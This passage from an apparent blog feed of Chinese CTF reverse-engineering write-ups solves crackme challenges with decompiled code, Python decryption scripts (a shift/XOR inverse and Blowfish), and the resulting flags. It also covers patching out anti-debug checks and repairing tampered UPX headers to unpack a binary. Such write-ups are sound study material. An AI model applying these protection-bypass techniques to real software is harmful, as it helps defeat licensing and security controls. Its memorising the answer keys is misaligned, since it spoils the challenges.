v4;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>~~这啥啊，看不懂。。。~~最外层循环控制轮数，内层循环控制一轮的加密次数，根据这个来直接写逆向？？</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __usercall <span class="symbol">sub_1005FDE0@<span class="keyword">&lt;eax&gt;</span></span>(__int64 <span class="symbol">pnum@<span class="keyword">&lt;edx:eax&gt;</span></span>, unsigned __int8 <span class="symbol">ahigh@<span class="keyword">&lt;cl&gt;</span></span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ahigh &gt;= <span class="number">64</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v2) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ahigh &gt;= <span class="number">32</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v2) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> pnum &lt;&lt; (ahigh &amp; <span class="number">0x1F</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这里似乎sub_10059F9F(v1, HIDWORD(v4))的位置有问题，是ida反编译的锅，应该是先执行这个再if else</p><p>看汇编窗口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">debug033:1005FDE0 ; int __usercall sub_1005FDE0@&lt;eax&gt;(__int64 pnum@&lt;edx:eax&gt;, unsigned __int8 ahigh@&lt;cl&gt;)</span><br><span class="line">debug033:1005FDE0 sub_1005FDE0    proc near               ; CODE XREF: cal↑j</span><br><span class="line">debug033:1005FDE0                 cmp     cl, 40h ; &#x27;@&#x27;</span><br><span class="line">debug033:1005FDE3                 jnb     short loc_1005FDFA</span><br><span class="line">debug033:1005FDE5                 cmp     cl, 20h ; &#x27; &#x27;</span><br><span class="line">debug033:1005FDE8                 jnb     short loc_1005FDF0</span><br><span class="line">debug033:1005FDEA                 shld    edx, eax, cl</span><br><span class="line">debug033:1005FDED                 shl     eax, cl</span><br><span class="line">debug033:1005FDEF                 retn</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     cl, 1  ;在调用cal之前</span><br></pre></td></tr></table></figure><p>这里的cl就是1，和传入无关，最后有一句shl     eax, cl</p><p>shl是<code>双精度左移</code>，这是类似循环左移的操作，即左移，右边的空值由左边溢出的值补充，类似还有shr双精度右移，并没有0x1f</p><p>因此，整体逻辑是：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先分组为<span class="number">8</span>字节<span class="built_in">x6</span>组</span><br><span class="line">如果是奇数：与key再左移</span><br><span class="line">如果是偶数：直接左移</span><br><span class="line">得到结果</span><br></pre></td></tr></table></figure><p>所以逆向是</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">分组</span><br><span class="line">如果是奇数：与<span class="built_in">key</span>再右移</span><br><span class="line">如果是偶数：直接右移</span><br></pre></td></tr></table></figure><p>同时可以知道的是，</p><p>如果是奇数右移，左边应该补1</p><p>如果是偶数右移，左边不用补</p><p>那么逆向：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">0x4D</span>, <span class="number">0xB8</span>, <span class="number">0x76</span>, <span class="number">0x29</span>, <span class="number">0xF5</span>, <span class="number">0xA9</span>, <span class="number">0x9E</span>, <span class="number">0x59</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0xB1</span>, <span class="number">0xC4</span>, <span class="number">0x2F</span>, <span class="number">0x21</span>, <span class="number">0x2C</span>, <span class="number">0x30</span>, <span class="number">0xB3</span>, <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x17</span>, <span class="number">0xA8</span>, <span class="number">0xED</span>, <span class="number">0xF7</span>, <span class="number">0xDB</span>, <span class="number">0xE1</span>, <span class="number">0x53</span>, <span class="number">0xF0</span>, <span class="number">0xDB</span>, <span class="number">0xE9</span>, <span class="number">0x03</span>, <span class="number">0x51</span>, <span class="number">0x5E</span>, <span class="number">0x09</span>, <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0xDF</span>, <span class="number">0xF0</span>, <span class="number">0x96</span>, <span class="number">0xFC</span>, <span class="number">0xC1</span>, <span class="number">0xB5</span>, <span class="number">0xE6</span>, <span class="number">0x62</span>, <span class="number">0x95</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">q = [<span class="number">0x599EA9F52976B84D</span>, <span class="number">0x302C212FC4B15655</span>, <span class="number">0xDBF7EDA8177879B3</span>, <span class="number">0x5E5103E9DBF053E1</span>, <span class="number">0xC1FC96F0DF00C109</span>, <span class="number">0x000000019562E6B5</span>]</span><br><span class="line">key = <span class="number">0x54AA4A9</span></span><br><span class="line">k=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span> (q[i] &amp; <span class="number">1</span>):</span><br><span class="line">            q[i] = (q[i] ^ key) &gt;&gt; <span class="number">1</span></span><br><span class="line">            q[i] |= <span class="number">0x8000000000000000</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            q[i] = (q[i] &gt;&gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    k.append(<span class="built_in">hex</span>(q[i]))</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"><span class="comment">#[&#x27;0x4530367b33673044&#x27;, &#x27;0x37352d4132374531&#x27;, &#x27;0x372d304642384136&#x27;, &#x27;0x2d39424243313037&#x27;, &#x27;0x4345353134323042&#x27;, &#x27;0x7d&#x27;]</span></span><br></pre></td></tr></table></figure><p>逆序，转hex，按字符逆序</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">D0g3</span>&#123;<span class="number">60</span>E1E72A-<span class="number">576</span>A8BF0-<span class="number">7701</span>CBB9-B02415EC&#125;</span><br></pre></td></tr></table></figure><h2 id="你见过蓝色的小鲸鱼吗">你见过蓝色的小鲸鱼吗</h2><p>打开文件后，发现是win程序，说明进入主窗口程序和判断函数不一定在一个位置</p><p>所以打开后需要找到判断代码，搜索string无效</p><p>根据弹窗函数是MessageBox，尝试搜索</p><p>然后找到判断函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">lastcall</span><span class="params">(<span class="type">void</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> wrong[<span class="number">28</span>]; <span class="comment">// [esp+D0h] [ebp-54h] BYREF</span></span><br><span class="line">  CHAR yes[<span class="number">20</span>]; <span class="comment">// [esp+ECh] [ebp-38h] BYREF</span></span><br><span class="line">  CHAR Caption[<span class="number">24</span>]; <span class="comment">// [esp+100h] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+118h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = this;</span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_52102F);</span><br><span class="line">  <span class="built_in">strcpy</span>(Caption, <span class="string">&quot;tip&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(yes, <span class="string">&quot;You Get It!&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(wrong, <span class="string">&quot;Wrong user/passwd&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)v5 + <span class="number">2</span>) != *((_DWORD *)v5 + <span class="number">3</span>)</span><br><span class="line">    || j__memcmp(*(<span class="type">const</span> <span class="type">void</span> **)v5, *((<span class="type">const</span> <span class="type">void</span> **)v5 + <span class="number">1</span>), *((_DWORD *)v5 + <span class="number">3</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, wrong, Caption, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, yes, Caption, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的v5+2和v5+3一定指向一个是输入（可能加密了），另一个说不准，因为有一个密码一个用户名</p><p>由于需要进入else分支，所以条件必须为假</p><p>即：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*((_DWORD *)v5 + <span class="number">2</span>) == *((_DWORD *)v5 + <span class="number">3</span>)</span><br><span class="line">    &amp;&amp; ！j__memcmp<span class="comment">(*(const void **)</span>v5, *((<span class="keyword">const</span> void **)v5 + <span class="number">1</span>), *((_DWORD *)v5 + <span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>既然如此，需要找出能改变v5+2和+3的地址的函数（修改了this），向上找：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [esp+10h] [ebp-154h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+24h] [ebp-140h]</span></span><br><span class="line">  CHAR *v6; <span class="comment">// [esp+114h] [ebp-50h]</span></span><br><span class="line">  CHAR *lpString; <span class="comment">// [esp+120h] [ebp-44h]</span></span><br><span class="line">  HWND DlgItem; <span class="comment">// [esp+12Ch] [ebp-38h]</span></span><br><span class="line">  HWND hWnd; <span class="comment">// [esp+138h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+144h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> WindowTextLengthA; <span class="comment">// [esp+150h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_52105E);</span><br><span class="line">  hWnd = GetDlgItem((HWND)argc, <span class="number">1003</span>);</span><br><span class="line">  DlgItem = GetDlgItem((HWND)argc, <span class="number">1004</span>);</span><br><span class="line">  WindowTextLengthA = GetWindowTextLengthA(hWnd);</span><br><span class="line">  v10 = GetWindowTextLengthA(DlgItem);</span><br><span class="line">  lpString = (CHAR *)j__malloc(__CFADD__(WindowTextLengthA, <span class="number">16</span>) ? <span class="number">-1</span> : WindowTextLengthA + <span class="number">16</span>);</span><br><span class="line">  result = (<span class="type">int</span>)j__malloc(__CFADD__(v10, <span class="number">16</span>) ? <span class="number">-1</span> : v10 + <span class="number">16</span>);</span><br><span class="line">  v6 = (CHAR *)result;</span><br><span class="line">  <span class="keyword">if</span> ( lpString &amp;&amp; result )</span><br><span class="line">  &#123;</span><br><span class="line">    GetWindowTextA(hWnd, lpString, WindowTextLengthA + <span class="number">16</span>);</span><br><span class="line">    GetWindowTextA(DlgItem, v6, v10 + <span class="number">16</span>);</span><br><span class="line">    v5 = operator new(<span class="number">0x10</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_451B43(<span class="number">0x10</span>u);</span><br><span class="line">      v4 = (<span class="type">void</span> *)sub_450CE3(v5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_44FC2B(&amp;unk_51D38C, <span class="number">0x10</span>u);</span><br><span class="line">    sub_45126F(lpString, WindowTextLengthA, (<span class="type">int</span>)v6, v10);</span><br><span class="line">    j_lastcall(v4);</span><br><span class="line">    j__free(lpString);</span><br><span class="line">    j__free(v6);</span><br><span class="line">    result = (<span class="type">int</span>)v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">return</span> sub_44F77B(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动调可知：第一个是用户名，第二个是密码</p><p>化简：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [esp+10h] [ebp-154h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+24h] [ebp-140h]</span></span><br><span class="line">  CHAR *password; <span class="comment">// [esp+114h] [ebp-50h]</span></span><br><span class="line">  CHAR *username; <span class="comment">// [esp+120h] [ebp-44h]</span></span><br><span class="line">  HWND DlgItem; <span class="comment">// [esp+12Ch] [ebp-38h]</span></span><br><span class="line">  HWND hWnd; <span class="comment">// [esp+138h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> lenOFpass; <span class="comment">// [esp+144h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> lenOFname; <span class="comment">// [esp+150h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_52105E);</span><br><span class="line">  hWnd = GetDlgItem((HWND)argc, <span class="number">1003</span>);</span><br><span class="line">  DlgItem = GetDlgItem((HWND)argc, <span class="number">1004</span>);</span><br><span class="line">  lenOFname = GetWindowTextLengthA(hWnd);</span><br><span class="line">  lenOFpass = GetWindowTextLengthA(DlgItem);</span><br><span class="line">  username = (CHAR *)j__malloc(__CFADD__(lenOFname, <span class="number">16</span>) ? <span class="number">-1</span> : lenOFname + <span class="number">16</span>);</span><br><span class="line">  result = (<span class="type">int</span>)j__malloc(__CFADD__(lenOFpass, <span class="number">16</span>) ? <span class="number">-1</span> : lenOFpass + <span class="number">16</span>);</span><br><span class="line">  password = (CHAR *)result;</span><br><span class="line">  <span class="keyword">if</span> ( username &amp;&amp; result )                     <span class="comment">// 检查空指针</span></span><br><span class="line">  &#123;</span><br><span class="line">    GetWindowTextA(hWnd, username, lenOFname + <span class="number">16</span>);<span class="comment">// 用户名</span></span><br><span class="line">    GetWindowTextA(DlgItem, password, lenOFpass + <span class="number">16</span>);<span class="comment">// 密码</span></span><br><span class="line">    v5 = operator new(<span class="number">0x10</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_451B43(<span class="number">0x10</span>u);                        <span class="comment">// 分配内存</span></span><br><span class="line">      v4 = (<span class="type">void</span> *)sub_450CE3(v5);              <span class="comment">// 初始化</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_44FC2B(&amp;specialloc, <span class="number">0x10</span>u);             <span class="comment">// 初始化对象</span></span><br><span class="line">    encode(username, lenOFname, (<span class="type">int</span>)password, lenOFpass);</span><br><span class="line">    j_lastcall(v4);                             <span class="comment">// 判断</span></span><br><span class="line">    j__free(username);</span><br><span class="line">    j__free(password);</span><br><span class="line">    result = (<span class="type">int</span>)v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">return</span> sub_44F77B(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面实在分析不出来了，里面有一些涉及c++的理解的,所以看看wp</p><p>在后面有加密函数，用插件findcrypt可以直接看出来是blowfish</p><p>在cmp时下断点buf1就是最后的值</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11A51F049550E2508F17E16CF1632B47</span><br></pre></td></tr></table></figure><p>写blowfish的解密：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文（以十六进制表示）</span></span><br><span class="line">ciphertext_hex = <span class="string">&quot;11A51F049550E2508F17E16CF1632B47&quot;</span></span><br><span class="line">ciphertext = binascii.unhexlify(ciphertext_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥（简单字符串）</span></span><br><span class="line">key = <span class="string">&quot;UzBtZTBuZV9EMGcz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Blowfish ECB模式的解密器</span></span><br><span class="line">cipher = Blowfish.new(key.encode(<span class="string">&#x27;utf-8&#x27;</span>), Blowfish.MODE_ECB)</span><br><span class="line"></span><br><span class="line">plaintext_bytes = cipher.decrypt(ciphertext)</span><br><span class="line">plaintext = plaintext_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"><span class="comment">#QHRoZWJsdWVmMXNo</span></span><br></pre></td></tr></table></figure><p>这个答案是个base64，解密后是@thebluef1sh</p><p>（和蓝鲸的唯一关系吗。。。）</p><p>所以</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">D0g3</span><span class="template-variable">&#123;UzBtZTBuZV9EMGczQHRoZWJsdWVmMXNo&#125;</span></span><br></pre></td></tr></table></figure><hr><p>写完啦，</p><p>如有错误，请在下方评论区写下您的想法。感谢！</p><details class="folding-tag" ><summary> 题目下载 </summary>              <div class='content'>              <div class="tag link"><a class="link-card" title="(百度网盘)" href="https://pan.baidu.com/s/1XAZU4ED-xjuUVUno-Kx81Q?pwd=Game"><div class="left"><img src="/assets/coffee.png"/></div><div class="right"><p class="text">(百度网盘)</p><p class="url">https://pan.baidu.com/s/1XAZU4ED-xjuUVUno-Kx81Q?pwd=Game</p></div></a></div><p>解压密码:</p><p>pRism</p>              </div>            </details>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录(2)</title>
      <link href="/posts/8f76d0c7.html"/>
      <url>/posts/8f76d0c7.html</url>
      
        <content type="html"><![CDATA[<h1>NSSCTF</h1><h2 id="NSSRound-4-SWPU-hide-and-seek">[NSSRound#4 SWPU]hide_and_seek</h2><p>打开调试后，发现有反调试，把一开始的exit给nop掉</p><p>然后调试跳到后面发现有flag：SCTF{wud3_0n@,34p}</p><p>但是结果不对？？</p><p>再次调试，在hex视图中alt+t搜索NSSCTF，发现flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">NSSCTF</span><span class="template-variable">&#123;h1d3_0n_h34p&#125;</span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-X-Basic-ez-z3">[NSSRound#X Basic]ez_z3</h2><p>先用die查壳，发现是upx，尝试用upx-d脱壳，然后失败，应该是改过什么东西，打开ida看看，结果发现节区名从UPX变成了XYU，所以尝试还原，还原后还是失败，在03E0处还需修改为UPX，这次UPX-d成功，参考<a href="https://www.52pojie.cn/thread-326995-1-1.html">UPX防脱壳机脱壳、去除特征码、添加花指令小探 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><p>打开ida查看main函数并尝试调试</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Please input the flag:<span class="number">1212121</span></span><br><span class="line">Can you calculated out z3?</span><br><span class="line">Please input z3:<span class="number">121212</span></span><br><span class="line">YOU are wrong</span><br><span class="line">oh no!!!!!your flag is wrong,try again</span><br></pre></td></tr></table></figure><p>main函数大致逻辑：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(std::cout, <span class="string">&quot;Please input the flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">getin</span>(std::cin, flag);</span><br><span class="line">  v3 = <span class="built_in">print</span>(std::cout, <span class="string">&quot;Can you calculated out z3?&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, guessNoUse);</span><br><span class="line">  <span class="built_in">print</span>(std::cout, <span class="string">&quot;Please input z3:&quot;</span>);</span><br><span class="line">  <span class="built_in">getin</span>(std::cin, z3num);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">j_strlen</span>(flag); ++i )</span><br><span class="line">    storn[i] = <span class="built_in">change</span>(flag[i], exenum[i]);</span><br><span class="line">  <span class="built_in">z3check1</span>(z3num);</span><br><span class="line">  <span class="built_in">z3check2</span>(z3num);</span><br><span class="line">  check = <span class="built_in">sub_7FF7CCBC10E6</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( check == <span class="number">1</span> )</span><br><span class="line">    v4 = <span class="built_in">print</span>(std::cout, <span class="string">&quot;yeah!!!!!!you get the flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v4 = <span class="built_in">print</span>(std::cout, <span class="string">&quot;oh no!!!!!your flag is wrong,try again&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, guessNoUse);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据流程大致是先对flag变换为k，然后检测输入一个z3序列是否满足条件，然后让z3序列和k变换，检查最后结果</p><p>那么先找到z3num：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 